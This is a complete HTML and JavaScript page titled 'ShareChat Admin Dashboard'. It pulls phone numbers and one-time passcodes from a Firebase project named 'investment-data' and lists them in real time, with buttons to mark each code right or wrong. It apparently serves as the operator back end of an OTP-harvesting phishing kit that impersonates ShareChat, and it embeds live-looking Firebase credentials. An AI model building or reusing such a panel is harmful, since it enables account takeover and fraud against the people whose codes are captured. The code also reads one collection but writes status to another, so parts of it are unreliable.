<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>ShareChat Admin Dashboard</title>
  <link href="https://fonts.googleapis.com/css?family=Inter:400,600,700&display=swap" rel="stylesheet">
  <style>
    :root{
      --brand:#7765e3;
      --bg:#f5f7fa;
      --card:#fff;
      --text:#333;
      --muted:#6c757d;
      --border:#e0e2e6;
      --hover:#f8f9fa;
      --success:#28a745;
      --danger:#dc3545;
    }
    *{box-sizing:border-box}
    body{
      margin:0; padding:0;
      font-family:'Inter',Arial,sans-serif;
      background:var(--bg); color:var(--text);
    }
    .container{max-width:1200px;margin:0 auto;padding:20px}
    header{
      background:var(--brand); color:#fff;
      padding:20px 0; margin-bottom:30px;
      border-radius:0 0 10px 10px;
      box-shadow:0 4px 12px rgba(0,0,0,.1);
    }
    .header-content{
      display:flex; justify-content:space-between; align-items:center; padding:0 20px;
    }
    h1{margin:0; font-size:22px}
    .logout-btn{
      background:#fff; color:var(--brand); border:none;
      padding:8px 14px; border-radius:6px; font-weight:600; cursor:pointer; transition:.2s;
    }
    .logout-btn:hover{background:#f0f0f0}

    .dashboard-stats{
      display:grid; grid-template-columns:repeat(auto-fit,minmax(140px,1fr));
      gap:12px; margin-bottom:20px;
    }
    .stat-card{
      background:var(--card); border-radius:10px; padding:15px;
      box-shadow:0 2px 8px rgba(0,0,0,.05); text-align:center;
    }
    .stat-value{font-size:20px; font-weight:700; color:var(--brand); margin:8px 0}
    .stat-label{color:var(--muted); font-size:13px}

    .data-table{background:#fff; border-radius:10px; overflow:hidden; box-shadow:0 2px 8px rgba(0,0,0,.05)}
    table{width:100%; border-collapse:collapse; min-width:720px}
    th,td{padding:12px; text-align:left; border-bottom:1px solid var(--border); font-size:14px}
    th{background:#f8f9fa; font-weight:600; color:#495057}
    tr:hover{background:var(--hover)}
    .status-verified{color:var(--success); font-weight:700}
    .status-wrong{color:var(--danger); font-weight:700}

    .status-actions{display:inline-flex; gap:8px;}
    .btn-r,.btn-w{
      width:32px; height:28px; line-height:28px; text-align:center;
      background:#fff; border:1.5px solid; border-radius:6px; cursor:pointer; font-weight:800; font-size:13px;
      transition:.15s;
    }
    .btn-r{border-color:var(--success); color:var(--success)}
    .btn-w{border-color:var(--danger); color:var(--danger)}
    .btn-r:active{background:#eaf8ee}
    .btn-w:active{background:#fde9ec}

    @media (max-width:600px){
      table{min-width:unset; border:0}
      thead{display:none}
      tbody{display:block}
      tr{
        display:block; margin:12px; background:#fff;
        border:1px solid var(--border); border-radius:10px;
        box-shadow:0 1px 6px rgba(0,0,0,.06);
      }
      td{
        display:flex; align-items:center; justify-content:space-between;
        padding:12px; border-bottom:1px solid #f0f2f5; font-size:14px;
      }
      td:last-child{border-bottom:0}
      td::before{
        content:attr(data-label);
        font-weight:600; color:var(--muted);
        margin-right:12px; flex:0 0 45%;
      }
      .cell-value{flex:1; text-align:right; word-break:break-word; white-space:normal}
    }

    .pagination{display:flex; justify-content:center; padding:15px; flex-wrap:wrap; gap:4px;}
    .pagination button{
      background:#fff; border:1px solid #dee2e6; padding:6px 12px;
      cursor:pointer; border-radius:4px; transition:.2s; font-size:14px;
    }
    .pagination button.active{background:var(--brand); color:#fff; border-color:var(--brand)}
    .pagination button:hover:not(.active){background:#f8f9fa}
  </style>
</head>
<body>
  <header>
    <div class="container header-content">
      <h1>ShareChat Admin Dashboard</h1>
      <button class="logout-btn" id="logout-btn">Logout</button>
    </div>
  </header>

  <div class="container">
    <div class="dashboard-stats">
      <div class="stat-card">
        <div class="stat-value" id="total-users">0</div>
        <div class="stat-label">Total Entries</div>
      </div>
      <div class="stat-card">
        <div class="stat-value" id="today-users">0</div>
        <div class="stat-label">Today's Entries</div>
      </div>
      <div class="stat-card">
        <div class="stat-value" id="pending-otp">0</div>
        <div class="stat-label">Pending</div>
      </div>
      <div class="stat-card">
        <div class="stat-value" id="verified-users">0</div>
        <div class="stat-label">Verified</div>
      </div>
    </div>

    <div class="data-table">
      <table>
        <thead>
          <tr>
            <th>Doc ID</th>
            <th>Phone Number</th>
            <th>OTP</th>
            <th>Status</th>
            <th>Timestamp</th>
          </tr>
        </thead>
        <tbody id="user-data"></tbody>
      </table>

      <div class="pagination" id="pagination"></div>
    </div>
  </div>

  <!-- Firebase SDKs -->
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyDIF-yzrdS153MMZtA4wzz5V7eoWUMsC9c",
      authDomain: "investment-data-3b577.firebaseapp.com",
      projectId: "investment-data-3b577",
      storageBucket: "investment-data-3b577.appspot.com",
      messagingSenderId: "1022915676761",
      appId: "1:1022915676761:web:fbad19127c0b568f8fff48",
      measurementId: "G-PTBF5R788Y"
    };
    firebase.initializeApp(firebaseConfig);
    const auth = firebase.auth();
    const db = firebase.firestore();
  </script>

  <script>
    document.addEventListener('DOMContentLoaded', async function () {
      const tbody = document.getElementById('user-data');
      const paginationEl = document.getElementById('pagination');
      const rowsPerPage = 10;
      let currentPage = 1;
      let allData = []; // will be filled from Firestore in realtime

      // OPTIONAL: sign-in anonymously (works with relaxed rules)
      try { await auth.signInAnonymously(); } catch(e) { console.warn(e); }

      // Realtime listener
      db.collection('users')
        .orderBy('createdAt', 'desc')
        .onSnapshot((snap) => {
          allData = [];
          snap.forEach(doc => {
            const d = doc.data();
            allData.push({
              id: doc.id,
              phone: d.phone || '',
              otp: d.otp || '',
              status: d.status || 'Pending',
              timestamp: d.createdAt && d.createdAt.toDate ? d.createdAt.toDate() : null
            });
          });
          renderAll();
        });

      // Renderers
      function renderTable(page) {
        tbody.innerHTML = '';
        const start = (page - 1) * rowsPerPage;
        const end = start + rowsPerPage;
        const pageData = allData.slice(start, end);

        pageData.forEach(user => {
          const row = document.createElement('tr');
          const ts = user.timestamp ? formatDateIST(user.timestamp) : '-';
          row.innerHTML = `
            <td data-label="Doc ID"><span class="cell-value">${user.id}</span></td>
            <td data-label="Phone Number"><span class="cell-value">${user.phone}</span></td>
            <td data-label="OTP"><span class="cell-value">${user.otp}</span></td>
            <td data-label="Status">
              ${user.status === 'Verified' || user.status === 'Wrong'
                ? `<span class="${user.status === 'Verified' ? 'status-verified' : 'status-wrong'}">${user.status}</span>`
                : `<div class="status-actions">
                     <button class="btn-r" data-id="${user.id}">R</button>
                     <button class="btn-w" data-id="${user.id}">W</button>
                   </div>`
              }
            </td>
            <td data-label="Timestamp"><span class="cell-value">${ts}</span></td>
          `;
          tbody.appendChild(row);
        });
      }

      function renderPagination() {
        paginationEl.innerHTML = '';
        const pageCount = Math.ceil(allData.length / rowsPerPage) || 1;

        const prevBtn = document.createElement('button');
        prevBtn.textContent = 'Previous';
        prevBtn.disabled = currentPage === 1;
        prevBtn.onclick = () => { if (currentPage > 1) { currentPage--; renderAll(); } };
        paginationEl.appendChild(prevBtn);

        for (let i = 1; i <= pageCount; i++) {
          const btn = document.createElement('button');
          btn.textContent = i;
          if (i === currentPage) btn.classList.add('active');
          btn.onclick = () => { currentPage = i; renderAll(); };
          paginationEl.appendChild(btn);
        }

        const nextBtn = document.createElement('button');
        nextBtn.textContent = 'Next';
        nextBtn.disabled = currentPage === pageCount;
        nextBtn.onclick = () => { if (currentPage < pageCount) { currentPage++; renderAll(); } };
        paginationEl.appendChild(nextBtn);
      }

      // Update status on click
      tbody.addEventListener('click', async function(e){
        if (e.target.classList.contains('btn-r') || e.target.classList.contains('btn-w')) {
          const id = e.target.getAttribute('data-id');
          const newStatus = e.target.classList.contains('btn-r') ? 'Verified' : 'Wrong';
          try {
            await db.collection('submissions').doc(id).update({ status: newStatus });
          } catch (err) {
            alert('Failed to update status');
            console.error(err);
          }
        }
      });

      function renderAll() {
        // Stats
        document.getElementById('total-users').textContent = allData.length.toString();
        const today = new Date();
        const istOffset = 5.5 * 60; // minutes
        const start = new Date(Date.UTC(today.getUTCFullYear(), today.getUTCMonth(), today.getUTCDate()));
        const end = new Date(start.getTime() + 24*60*60*1000);
        // Convert to IST by adding 5:30 to UTC midnight for range check
        const startIST = new Date(start.getTime() + istOffset*60*1000);
        const endIST = new Date(end.getTime() + istOffset*60*1000);
        const todays = allData.filter(x => x.timestamp && x.timestamp >= startIST && x.timestamp < endIST);
        document.getElementById('today-users').textContent = todays.length.toString();
        const pending = allData.filter(x => (x.status || 'Pending') === 'Pending').length;
        const verified = allData.filter(x => x.status === 'Verified').length;
        document.getElementById('pending-otp').textContent = pending.toString();
        document.getElementById('verified-users').textContent = verified.toString();

        renderTable(currentPage);
        renderPagination();
      }

      function pad(n){ return n < 10 ? '0'+n : n; }
      function formatDateIST(dateObj){
        // format as YYYY-MM-DD HH:mm:ss IST
        const y = dateObj.getFullYear();
        const m = pad(dateObj.getMonth() + 1);
        const d = pad(dateObj.getDate());
        const hh = pad(dateObj.getHours());
        const mm = pad(dateObj.getMinutes());
        const ss = pad(dateObj.getSeconds());
        return `${y}-${m}-${d} ${hh}:${mm}:${ss}`;
      }

      document.getElementById('logout-btn').addEventListener('click', async () => {
        try { await auth.signOut(); location.reload(); } catch(e){ console.warn(e); }
      });
    });
  </script>
</body>
</html>
